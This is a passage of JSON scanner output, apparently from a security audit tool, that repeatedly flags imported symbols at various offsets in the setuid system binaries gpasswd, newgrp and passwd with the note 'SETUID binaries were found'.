                  "details": "Offset: 0x00016098, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x000160a0, Symbol: __environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x000160a8, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x000160c0, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006b30, Symbol: setsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006b70, Symbol: endsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006bb0, Symbol: sgetsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006d60, Symbol: fgetsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006ed0, Symbol: getsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006f10, Symbol: getsgnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006f50, Symbol: putsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad40, Symbol: endgrent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad48, Symbol: getenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad50, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad58, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad60, Symbol: strcasecmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad68, Symbol: closelog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad70, Symbol: endspent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad78, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad80, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad88, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad90, Symbol: strcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad98, Symbol: getgrent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ada0, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ada8, Symbol: getpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000adb0, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000adb8, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000adc0, Symbol: getspnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000adc8, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000add0, Symbol: stpcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000add8, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ade0, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ade8, Symbol: getpwuid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000adf0, Symbol: chdir, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000adf8, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae00, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae08, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae10, Symbol: rewind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae18, Symbol: setgrent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae20, Symbol: getgrgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae28, Symbol: audit_open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae30, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae38, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae40, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae48, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae50, Symbol: setgroups, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae58, Symbol: strspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae60, Symbol: strcspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae68, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae70, Symbol: calloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae78, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae80, Symbol: putc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae88, Symbol: signal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae90, Symbol: feof, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae98, Symbol: strtol, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aea0, Symbol: memcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aea8, Symbol: getgrnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aeb0, Symbol: kill, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aeb8, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aec0, Symbol: getgroups, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aec8, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aed0, Symbol: endpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aed8, Symbol: getlogin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aee0, Symbol: __strncpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aee8, Symbol: ttyname, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aef0, Symbol: realloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aef8, Symbol: getgrgid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af00, Symbol: getpwnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af08, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af10, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af18, Symbol: __syslog_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af20, Symbol: setgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af28, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af30, Symbol: getpass, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af38, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af40, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af48, Symbol: perror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af50, Symbol: sysconf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af58, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af60, Symbol: openlog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af68, Symbol: getgrnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af70, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af78, Symbol: execle, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af80, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af88, Symbol: audit_log_user_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af90, Symbol: audit_log_acct_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af98, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afa0, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afa8, Symbol: strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afb0, Symbol: execl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afb8, Symbol: crypt, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afc0, Symbol: sleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afc8, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afd0, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afd8, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afe0, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afe8, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aff0, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aff8, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000b5e0, Symbol: __environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000b600, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x000032d0, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00003370, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec18, Symbol: utime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec20, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec28, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec30, Symbol: is_selinux_enabled, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec38, Symbol: strcasecmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec40, Symbol: closelog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec48, Symbol: pam_start, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec50, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec58, Symbol: unlink, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec60, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec68, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec70, Symbol: strcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec78, Symbol: chroot, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec80, Symbol: sgetspent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec88, Symbol: putspent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec90, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec98, Symbol: lckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eca0, Symbol: qsort, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eca8, Symbol: selinux_check_access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecb0, Symbol: fcntl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecb8, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecc0, Symbol: getpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecc8, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecd0, Symbol: __open_2, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecd8, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ece0, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ece8, Symbol: pam_chauthtok, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecf0, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecf8, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed00, Symbol: __lxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed08, Symbol: getpwuid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed10, Symbol: pam_end, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed18, Symbol: chdir, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed20, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed28, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed30, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed38, Symbol: pam_strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed40, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed48, Symbol: snprintf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed50, Symbol: audit_open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed58, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed60, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed68, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed70, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed78, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed80, Symbol: selinux_set_callback, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed88, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed90, Symbol: strspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed98, Symbol: matchpathcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eda0, Symbol: fputc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eda8, Symbol: strcspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edb0, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edb8, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edc0, Symbol: execve, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edc8, Symbol: calloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edd0, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edd8, Symbol: putc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ede0, Symbol: signal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ede8, Symbol: strtoll, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edf0, Symbol: setpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edf8, Symbol: __memcpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee00, Symbol: getprevcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee08, Symbol: feof, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee10, Symbol: umask, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee18, Symbol: strtol, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee20, Symbol: realpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee28, Symbol: getgrnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee30, Symbol: getpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee38, Symbol: kill, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee40, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee48, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee50, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee58, Symbol: setfscreatecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee60, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee68, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee70, Symbol: __vasprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee78, Symbol: __fxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee80, Symbol: endpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee88, Symbol: getlogin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee90, Symbol: fseek, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee98, Symbol: security_getenforce, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eea0, Symbol: __fgets_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eea8, Symbol: __strncpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eeb0, Symbol: setrlimit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eeb8, Symbol: setreuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eec0, Symbol: setregid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eec8, Symbol: realloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eed0, Symbol: fdopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eed8, Symbol: getpwnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eee0, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eee8, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eef0, Symbol: fchmod, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eef8, Symbol: strftime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef00, Symbol: __syslog_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef08, Symbol: fsync, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef10, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef18, Symbol: getspnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef20, Symbol: open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef28, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef30, Symbol: fchown, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef38, Symbol: audit_log_user_avc_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
